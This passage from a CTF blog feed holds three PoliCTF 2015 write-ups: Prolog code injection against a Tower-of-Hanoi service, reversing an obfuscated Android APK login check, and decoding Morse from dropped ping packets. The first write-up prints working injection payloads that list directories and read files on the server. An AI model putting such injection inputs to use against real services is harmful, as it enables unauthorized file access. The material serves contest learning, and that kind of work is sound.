+<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+0), expand_file_name('/home/*', S), write(S). 
+[/home/ctf,/home/ubuntu]
+
+# enumerate /home/ctf:
+
+bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+0), expand_file_name('/home/ctf/*', S), write(S). %
+[/home/ctf/haas]bas@tritonal:~$ 
+
+# enumerate /home/ctf/haas:
+
+bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+0), expand_file_name('/home/ctf/haas/*', S), write(S).  
+[/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here]
+</code></pre>
+
+<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>
+
+<pre><code class="bash">bas@tritonal:~$ nc haas.polictf.it 80
+Welcome to the Hanoi-as-a-Service cloud platform!
+How many disks does your tower have?
+0), open('/home/ctf/haas/jhknsjdfhef_flag_here', read, S), read_line_to_codes(S, T), write(T). 
+[102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
+</code></pre>
+
+<p>Back to python!</p>
+
+<pre><code class="python">&gt;&gt;&gt; a = [102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125]
+&gt;&gt;&gt; print "".join([chr(x) for x in a])
+flag{Pr0gramm1ng_in_l0g1c_1s_c00l}
+</code></pre>
+
+<p>50 points and first blood for Team Vulnhub.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PoliCTF 2015 - Crack Me if You Can]]></title>
+    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can/"/>
+    <updated>2015-07-12T12:12:22+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can</id>
+    <content type="html"><![CDATA[<p>Crack Me If You Can involved one of my least favorite things: Android APKs!</p>
+
+<!--more-->
+
+
+<p>I downloaded the APK and directly uploaded it to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>. Among the decompiled files I found <code>src/it/politctf/LoginActivity.java</code> and three other java files. After inspecting <code>LoginActivity.java</code>, I found this function:</p>
+
+<pre><code class="java">private boolean a(String s)
+    {
+        if (s.equals(c.a(it.polictf2015.b.a(it.polictf2015.b.b(it.polictf2015.b.c(it.polictf2015.b.d(it.polictf2015.b.g(it.polictf2015.b.h(it.polictf2015.b.e(it.polictf2015.b.f(it.polictf2015.b.i(c.c(c.b(c.d(getString(0x7f0c0038))))))))))))))))
+        {
+            Toast.makeText(getApplicationContext(), getString(0x7f0c003c), 1).show();
+            return true;
+        } else
+        {
+            return false;
+        }
+    }
+</code></pre>
+
+<p>Interesting. It performs a bunch of operations on a string, which I don&rsquo;t know yet. However, on of the operations is this one:</p>
+
+<pre><code class="java">    public static String c(String s)
+    {
+        return s.replace("buga", "Goo");
+    }
+</code></pre>
+
+<p>So I did the following:</p>
+
+<pre><code class="bash">$ strings crack-me-if-you-can.apk  |grep buga
+ee[[c%l][c{g}[%{\%Mc%spdgj=]T%aat%=O%bRu%sc]c%ti[o%n=Wcs%=No[t=T][hct%=buga[d=As%=W]e=T%ho[u%[%g]h%t[%}%
+</code></pre>
+
+<p>I now had the string and all the operations on the string:</p>
+
+<pre><code class="java">public class b
+{
+
+    public static String a(String s)
+    {
+        return s.replace("c", "a");
+    }
+
+    public static String b(String s)
+    {
+        return s.replace("%", "");
+    }
+
+    public static String c(String s)
+    {
+        return s.replace("[", "");
+    }
+
+    public static String d(String s)
+    {
+        return s.replace("]", "");
+    }
+
+    public static String e(String s)
+    {
+        return s.replaceFirst("\\{", "");
+    }
+
+    public static String f(String s)
+    {
+        return s.replaceFirst("\\}", "");
+    }
+
+    public static String g(String s)
+    {
+        return s.replaceFirst("c", "f");
+    }
+
+    public static String h(String s)
+    {
+        return s.replaceFirst("R", "f");
+    }
+
+    public static String i(String s)
+    {
+        return s.replace("=", "_");
+    }
+}
+
+public class c
+{
+
+    public static String a(String s)
+    {
+        return s.replace("aa", "ca");
+    }
+
+    public static String b(String s)
+    {
+        return s.replace("aat", "his");
+    }
+
+    public static String c(String s)
+    {
+        return s.replace("buga", "Goo");
+    }
+
+    public static String d(String s)
+    {
+        return s.replace("spdgj", "yb%e");
+    }
+}
+</code></pre>
+
+<p>Using this string, I started working my way back, applying all the operations of <code>a.java</code>, <code>b.java</code> and <code>c.java</code> by hand. Finally, I ended up with the string <code>flag{Maybe_This_Obfuscation_Was_Not_That_Good_As_We_Thought}</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PoliCTF 2015 - John the Dropper]]></title>
+    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper/"/>
+    <updated>2015-07-12T12:00:27+02:00</updated>
+    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-john-the-dropper</id>
+    <content type="html"><![CDATA[<p>John the Dropper was an interesting 100 point challenge. I&rsquo;d love to see how it was implemented!</p>
+
+<!--more-->
+
+
+<p>We&rsquo;re given a host, <code>dropper.polictf.it</code>. It has no open ports, but the challenge description mentioned that John did not need ports to communicate. I left this challenge for a while, focusing on others. When I got back, superkojiman noticed that pinging this host dropped a lot of packets. He saw patterns: sometimes one packet dropped, sometimes three in a row. This made me think of Morse immediately.</p>
+
+<p>I started pinging the host and grabbed the output of <code>ping</code>:</p>
+
+<pre><code>PING dropper.polictf.it (52.18.119.20) 56(84) bytes of data.
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=1 ttl=50 time=23.8 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=3 ttl=50 time=24.2 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=5 ttl=50 time=24.1 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=7 ttl=50 time=23.8 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=8 ttl=50 time=23.9 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=12 ttl=50 time=23.8 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=16 ttl=50 time=24.2 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=20 ttl=50 time=23.9 ms
+64 bytes from ec2-52-18-119-20.eu-west-1.compute.amazonaws.com (52.18.119.20): icmp_req=21 ttl=50 time=24.0 ms
+...snip...
+</code></pre>
+
+<p>As you can see, request 2, 4 and 6 are dropped. With the following one-liner, I extracted the icmp_req numbers:</p>
+
+<pre><code class="bash">cat pings.txt |awk '{print $6}' |awk '{split($0,a,"="); print a[2]}' &gt; sequence.txt
+</code></pre>
+
+<p>I wrote a python script to translate the drops to Morse:</p>
+
+<pre><code class="python">seq = []
+
+with open('sequence.txt') as f:
+    lines = f.readlines()
+    for l in lines:
+        seq.append(int(l))
+    f.close()
+
+msg = ""
+for i in range(len(seq)-2):
+    if seq[i+1] - seq[i] - 1 == 0:
+        count += ' '
+    if seq[i+1] - seq[i] - 1 == 1:
+        msg += '.'
+    if seq[i+1] - seq[i] - 1 == 3:
+        msg += '-'
+print msg
+</code></pre>
+
+<p>Which yielded:</p>
+
+<pre><code>... --- ...    - .... .. ...    .. ...    - .... .    ..-. .-.. .- --. .--.- .. - -....- .. ... -....- -. . ...- . .-. -....- - --- --- -....- .-.. .- - . -....- ..-. --- .-. -....- .- -....- -.. .-. --- .--. .--.--   
+</code></pre>
+
+<p>The first three characters spell out &ldquo;SOS&rdquo;. I translated the rest by hand and found: <code>SOS THIS IS THE FLAG?IT?IS?NEVER?TOO?LATE?FOR?A?DROP?</code>. I couldn&rsquo;t really figure out the characters that are marked <code>?</code>. I guessed them to be underscores, but in the end, <a href="https://duckduckgo.com/?q=...+---+...++++-+....+..+...++++..+...++++-+....+.++++..-.+.-..+.-+--.+.--.-+..+-+-....-+..+...+-....-+-.+.+...-+.+.-.+-....-+-+---+---+-....-+.-..+.-+-+.+-....-+..-.+---+.-.+-....-+.-+-....-+-..+.-.+---+.--.+.--.--++++morse&amp;ia=answer">duckduckgo</a> came to the rescue. The final flag was lowercase: <code>flag{it-is-never-too-late-for-a-drop}</code>.</p>
 ]]></content>
   </entry>
   
